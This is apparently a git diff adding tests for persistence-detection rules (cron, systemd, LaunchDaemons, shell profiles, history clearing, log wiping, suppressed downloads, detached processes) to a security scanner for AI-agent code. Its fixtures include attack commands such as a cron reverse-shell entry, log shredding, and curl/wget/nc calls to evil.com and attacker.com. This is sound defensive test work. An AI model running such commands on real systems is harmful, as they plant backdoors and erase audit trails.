@@ -1,4 +1,4 @@
-import { injectionRules, exfiltrationRules, jailbreakRules, unsafeToolsRules, commandInjectionRules, ragRules, encodingRules, outputHandlingRules, multimodalRules, skillsRules, agenticRules, mcpRules, supplyChainRules, dosRules } from '../src/rules/index';
+import { injectionRules, exfiltrationRules, jailbreakRules, unsafeToolsRules, commandInjectionRules, ragRules, encodingRules, outputHandlingRules, multimodalRules, skillsRules, agenticRules, mcpRules, supplyChainRules, dosRules, persistenceRules } from '../src/rules/index';
 import type { ExtractedPrompt } from '../src/scanner/extractor';
 import { normalise } from '../src/scanner/extractor';
 
@@ -2978,6 +2978,206 @@ describe('MCP-012: MCP tool name contains prompt control keywords or suspicious 
 
   it('does not fire on non-code-block', () => {
     expect(rule.check(makePrompt("server.tool('system_override', ...)", 1, 'raw'), 'server.ts')).toHaveLength(0);
+  });
+});
+
+// ── PST-001: Cron persistence ─────────────────────────────────────────────────
+
+describe('PST-001: Cron job persistence', () => {
+  const rule = persistenceRules.find(r => r.id === 'PST-001')!;
+
+  it('flags crontab -e', () => {
+    expect(rule.check(makePrompt('crontab -e'), 'agent.ts')).toHaveLength(1);
+  });
+
+  it('flags pipe to crontab', () => {
+    expect(rule.check(makePrompt('echo "* * * * * /bin/bash -i" | crontab'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('flags write to /etc/cron.d/', () => {
+    expect(rule.check(makePrompt('tee /etc/cron.d/backdoor'), 'setup.sh')).toHaveLength(1);
+  });
+
+  it('flags /var/spool/cron/ path reference', () => {
+    expect(rule.check(makePrompt('cat /var/spool/cron/root'), 'recon.sh')).toHaveLength(1);
+  });
+
+  it('does not flag crontab -l (list only)', () => {
+    expect(rule.check(makePrompt('crontab -l'), 'check.sh')).toHaveLength(0);
+  });
+});
+
+// ── PST-002: Systemd persistence ──────────────────────────────────────────────
+
+describe('PST-002: Systemd service persistence', () => {
+  const rule = persistenceRules.find(r => r.id === 'PST-002')!;
+
+  it('flags systemctl enable', () => {
+    expect(rule.check(makePrompt('systemctl enable myservice'), 'deploy.sh')).toHaveLength(1);
+  });
+
+  it('flags systemctl daemon-reload', () => {
+    expect(rule.check(makePrompt('systemctl daemon-reload'), 'setup.sh')).toHaveLength(1);
+  });
+
+  it('flags tee to /etc/systemd/', () => {
+    expect(rule.check(makePrompt('tee /etc/systemd/system/backdoor.service'), 'install.sh')).toHaveLength(1);
+  });
+
+  it('flags cp to /lib/systemd/', () => {
+    expect(rule.check(makePrompt('cp backdoor.service /lib/systemd/system/'), 'install.sh')).toHaveLength(1);
+  });
+
+  it('does not flag systemctl status or start', () => {
+    expect(rule.check(makePrompt('systemctl status nginx'), 'ops.sh')).toHaveLength(0);
+  });
+});
+
+// ── PST-003: macOS LaunchDaemon/Agent persistence ─────────────────────────────
+
+describe('PST-003: macOS LaunchDaemon or LaunchAgent persistence', () => {
+  const rule = persistenceRules.find(r => r.id === 'PST-003')!;
+
+  it('flags cp to /Library/LaunchDaemons/', () => {
+    expect(rule.check(makePrompt('cp agent.plist /Library/LaunchDaemons/com.evil.plist'), 'install.sh')).toHaveLength(1);
+  });
+
+  it('flags tee to /Library/LaunchAgents/', () => {
+    expect(rule.check(makePrompt('tee /Library/LaunchAgents/com.backdoor.plist'), 'setup.sh')).toHaveLength(1);
+  });
+
+  it('flags launchctl load', () => {
+    expect(rule.check(makePrompt('launchctl load /Library/LaunchDaemons/com.evil.plist'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('does not flag launchctl list', () => {
+    expect(rule.check(makePrompt('launchctl list'), 'check.sh')).toHaveLength(0);
+  });
+});
+
+// ── PST-004: Shell profile modification ───────────────────────────────────────
+
+describe('PST-004: Shell profile modification', () => {
+  const rule = persistenceRules.find(r => r.id === 'PST-004')!;
+
+  it('flags append to ~/.bashrc', () => {
+    expect(rule.check(makePrompt('echo "alias ls=malware" >> ~/.bashrc'), 'setup.sh')).toHaveLength(1);
+  });
+
+  it('flags tee to ~/.zshrc', () => {
+    expect(rule.check(makePrompt('tee ~/.zshrc'), 'setup.sh')).toHaveLength(1);
+  });
+
+  it('flags write to /etc/profile', () => {
+    expect(rule.check(makePrompt('echo "export PATH=/evil:$PATH" >> /etc/profile'), 'root.sh')).toHaveLength(1);
+  });
+
+  it('flags write to /etc/profile.d/', () => {
+    expect(rule.check(makePrompt('tee /etc/profile.d/backdoor.sh'), 'root.sh')).toHaveLength(1);
+  });
+
+  it('does not flag reading ~/.bashrc', () => {
+    expect(rule.check(makePrompt('cat ~/.bashrc'), 'check.sh')).toHaveLength(0);
+  });
+});
+
+// ── PST-005: Audit evasion ────────────────────────────────────────────────────
+
+describe('PST-005: Audit evasion — shell history cleared or disabled', () => {
+  const rule = persistenceRules.find(r => r.id === 'PST-005')!;
+
+  it('flags history -c', () => {
+    expect(rule.check(makePrompt('history -c'), 'cleanup.sh')).toHaveLength(1);
+  });
+
+  it('flags HISTFILE=/dev/null', () => {
+    expect(rule.check(makePrompt('export HISTFILE=/dev/null'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('flags unset HISTFILE', () => {
+    expect(rule.check(makePrompt('unset HISTFILE'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('flags HISTSIZE=0', () => {
+    expect(rule.check(makePrompt('HISTSIZE=0'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('does not flag history -l (list)', () => {
+    expect(rule.check(makePrompt('history -l'), 'check.sh')).toHaveLength(0);
+  });
+});
+
+// ── PST-006: Log tampering ────────────────────────────────────────────────────
+
+describe('PST-006: Log tampering — truncate or shred on /var/log paths', () => {
+  const rule = persistenceRules.find(r => r.id === 'PST-006')!;
+
+  it('flags truncate on /var/log/', () => {
+    expect(rule.check(makePrompt('truncate -s 0 /var/log/auth.log'), 'cleanup.sh')).toHaveLength(1);
+  });
+
+  it('flags shred on /var/log/', () => {
+    expect(rule.check(makePrompt('shred -u /var/log/syslog'), 'cleanup.sh')).toHaveLength(1);
+  });
+
+  it('flags rm on /var/log/', () => {
+    expect(rule.check(makePrompt('rm -f /var/log/auth.log'), 'cleanup.sh')).toHaveLength(1);
+  });
+
+  it('does not flag read of /var/log/', () => {
+    expect(rule.check(makePrompt('tail -f /var/log/syslog'), 'monitor.sh')).toHaveLength(0);
+  });
+});
+
+// ── PST-007: Sensitive command output suppressed ──────────────────────────────
+
+describe('PST-007: Sensitive command output suppressed to /dev/null', () => {
+  const rule = persistenceRules.find(r => r.id === 'PST-007')!;
+
+  it('flags curl with full output suppression', () => {
+    expect(rule.check(makePrompt('curl http://evil.com/implant.sh > /dev/null 2>&1'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('flags wget with full output suppression', () => {
+    expect(rule.check(makePrompt('wget -O- evil.com/shell > /dev/null 2>&1'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('flags nc with full output suppression', () => {
+    expect(rule.check(makePrompt('nc attacker.com 4444 > /dev/null 2>&1'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('does not flag curl with only stderr suppressed', () => {
+    expect(rule.check(makePrompt('curl -s http://example.com 2>/dev/null'), 'check.sh')).toHaveLength(0);
+  });
+});
+
+// ── PST-008: Detached process spawning ───────────────────────────────────────
+
+describe('PST-008: Detached process spawning', () => {
+  const rule = persistenceRules.find(r => r.id === 'PST-008')!;
+
+  it('flags nohup', () => {
+    expect(rule.check(makePrompt('nohup ./backdoor &'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('flags setsid', () => {
+    expect(rule.check(makePrompt('setsid bash -c "./implant"'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('flags screen -dm', () => {
+    expect(rule.check(makePrompt('screen -dm bash -c "nc attacker.com 4444"'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('flags tmux new-session -d', () => {
+    expect(rule.check(makePrompt('tmux new-session -d -s bg "./implant"'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('flags disown', () => {
+    expect(rule.check(makePrompt('./backdoor & disown'), 'run.sh')).toHaveLength(1);
+  });
+
+  it('does not flag screen -r (reattach)', () => {
+    expect(rule.check(makePrompt('screen -r mysession'), 'check.sh')).toHaveLength(0);
   });
 });
 
